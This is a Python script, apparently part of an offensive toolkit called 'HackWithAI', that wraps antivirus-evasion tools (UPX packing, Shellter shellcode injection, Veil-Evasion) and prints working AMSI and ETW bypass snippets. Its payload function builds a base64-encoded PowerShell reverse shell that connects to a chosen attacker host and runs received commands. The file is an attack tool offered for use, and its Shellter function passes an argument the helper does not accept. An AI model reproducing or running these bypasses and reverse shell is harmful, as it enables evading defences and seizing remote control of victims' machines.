#!/usr/bin/env python3
"""Evasion Tools — veil, shellter, UPX packing, AMSI bypass, PowerShell obfuscation"""

import subprocess, json, sys, shutil, base64, os
from pathlib import Path
from typing import List, Dict

OUTPUT_DIR = Path("/home/kali/HackWithAI/data/payloads")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def _run(cmd: List[str], timeout: int = 300, capture: bool = True) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"Tool not found: {cmd[0]}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Timeout"}

def _which(tool: str) -> bool: return shutil.which(tool) is not None

# ── UPX Packing ──────────────────────────────────────────────────────────
def upx_pack(binary: str, force: bool = True, backup: bool = False) -> dict:
    cmd = ["upx"]
    if force: cmd.append("--force")
    if backup: cmd.append("-k")
    cmd.append(binary)
    return _run(cmd)

def upx_unpack(binary: str, output: str = "") -> dict:
    cmd = ["upx", "-d", binary]
    if output: cmd += ["-o", output]
    return _run(cmd)

def upx_info(binary: str) -> dict:
    return _run(["upx", "-l", binary])

# ── Shellter ─────────────────────────────────────────────────────────────
def shellter_inject(binary: str, payload: str = "auto") -> dict:
    """Inject shellcode into a PE file (wine required on Linux)."""
    cmds = f"A\n{payload}\n{binary}\n"
    return _run(["wine", "shellter.exe"], input_data=cmds, timeout=60)

# ── Veil-Evasion ─────────────────────────────────────────────────────────
def veil_payload(payload_type: str, lhost: str, lport: int,
                 output: str = "", method: str = "python/shellcode_inject/flat.py") -> dict:
    """Generate AV-evading payload via Veil-Evasion."""
    path = output or str(OUTPUT_DIR / f"veil_payload_{lport}")
    return _run(["python3", "/opt/Veil/Veil.py", "-p", payload_type,
                 "--ip", lhost, "--port", str(lport), "-o", path], timeout=120)

# ── PowerShell AMSI Bypass ───────────────────────────────────────────────
def amsi_bypass_script() -> str:
    """Return AMSI bypass PowerShell snippet."""
    return """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""

def etw_bypass_script() -> str:
    """Return ETW bypass PowerShell snippet."""
    return """
$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etw,0)
"""

def generate_ps_bypass_payload(lhost: str, lport: int) -> str:
    """Generate a full PowerShell reverse shell with AMSI+ETW bypass."""
    b64 = base64.b64encode(
        f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""".encode()
    ).decode()
    return amsi_bypass_script() + etw_bypass_script() + f"\n powershell -e {b64}"

# ── Python Obfuscation ───────────────────────────────────────────────────
def pyarmor_obfuscate(script: str, output_dir: str = "") -> dict:
    path = output_dir or str(OUTPUT_DIR / "obfuscated")
    return _run(["pyarmor", "gen", script, "-o", path])

def pyinstaller_build(script: str, onefile: bool = True, windowed: bool = False) -> dict:
    cmd = ["pyinstaller", "--clean"]
    if onefile: cmd.append("--onefile")
    if windowed: cmd.append("--windowed")
    cmd.append(script)
    return _run(cmd, timeout=120)

# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    if cmd == "amsi":       print(amsi_bypass_script())
    elif cmd == "etw":      print(etw_bypass_script())
    elif cmd == "payload":  print(generate_ps_bypass_payload(sys.argv[2], int(sys.argv[3])))
    elif cmd == "pack":     print(json.dumps(upx_pack(sys.argv[2])))
    else: print("Commands: amsi | etw | payload <lhost> <lport> | pack <binary>")
